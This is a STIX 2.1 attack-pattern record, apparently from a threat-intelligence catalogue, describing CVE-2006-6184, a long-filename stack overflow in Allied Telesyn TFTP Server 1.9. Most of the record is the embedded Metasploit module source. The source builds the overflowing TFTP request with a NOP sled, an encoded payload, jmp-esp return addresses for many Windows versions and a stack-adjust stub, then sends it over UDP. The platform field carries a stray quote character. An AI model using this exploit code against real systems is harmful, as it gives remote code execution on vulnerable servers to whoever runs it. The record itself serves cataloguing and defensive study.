{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a0527c02-aa62-4fae-8d7d-a08dd65a89dc",
    "created": "2024-08-14T16:50:29.428809Z",
    "modified": "2024-08-14T16:50:29.428813Z",
    "name": "Allied Telesyn TFTP Server 1.9 Long Filename Overflow",
    "description": " This module exploits a stack buffer overflow in AT-TFTP v1.9, by sending a request (get/write) for an overly long file name. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/tftp/attftp_long_filename.rb",
            "external_id": "attftp_long_filename.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-6184"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Allied Telesyn TFTP Server 1.9 Long Filename Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in AT-TFTP v1.9, by sending a\n        request (get/write) for an overly long file name.\n      },\n      'Author'         => [ 'aushack' ],\n      'References'     =>\n        [\n          ['CVE', '2006-6184'],\n          ['OSVDB', '11350'],\n          ['BID', '21320'],\n          ['EDB', '2887']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 210,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n        # Patrick - Tested OK w2k sp0, sp4, xp sp 0, xp sp2 - en 2007/08/24\n          [ 'Windows NT SP4 English',   { 'Ret' => 0x702ea6f7 } ],\n          [ 'Windows 2000 SP0 English', { 'Ret' => 0x750362c3 } ],\n          [ 'Windows 2000 SP1 English', { 'Ret' => 0x75031d85 } ],\n          [ 'Windows 2000 SP2 English', { 'Ret' => 0x7503431b } ],\n          [ 'Windows 2000 SP3 English', { 'Ret' => 0x74fe1c5a } ],\n          [ 'Windows 2000 SP4 English', { 'Ret' => 0x75031dce } ],\n          [ 'Windows XP SP0/1 English', { 'Ret' => 0x71ab7bfb } ],\n          [ 'Windows XP SP2 English',   { 'Ret' => 0x71ab9372 } ],\n          [ 'Windows XP SP3 English',   { 'Ret' => 0x7e429353 } ], # ret by c0re\n          [ 'Windows Server 2003',      { 'Ret' => 0x7c86fed3 } ], # ret donated by securityxxxpert\n          [ 'Windows Server 2003 SP2',  { 'Ret' => 0x7c86a01b } ], # ret donated by Polar Bear\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2006-11-27'))\n\n    register_options(\n      [\n        Opt::RPORT(69),\n        Opt::LHOST() # Required for stack offset\n      ])\n  end\n\n  def exploit\n    connect_udp\n\n    sploit = \"\\x00\\x02\" + make_nops(25 - datastore['LHOST'].length)\n    sploit << payload.encoded\n    sploit << [target['Ret']].pack('V') \t# <-- eip = jmp esp. we control it.\n    sploit << \"\\x83\\xc4\\x28\\xc3\" \t\t# <-- esp = add esp 0x28 + retn\n    sploit << \"\\x00\" + \"netascii\" + \"\\x00\"\n\n    udp_sock.put(sploit)\n\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-11-27",
    "x_mitre_platforms": [
        "win'"
    ]
}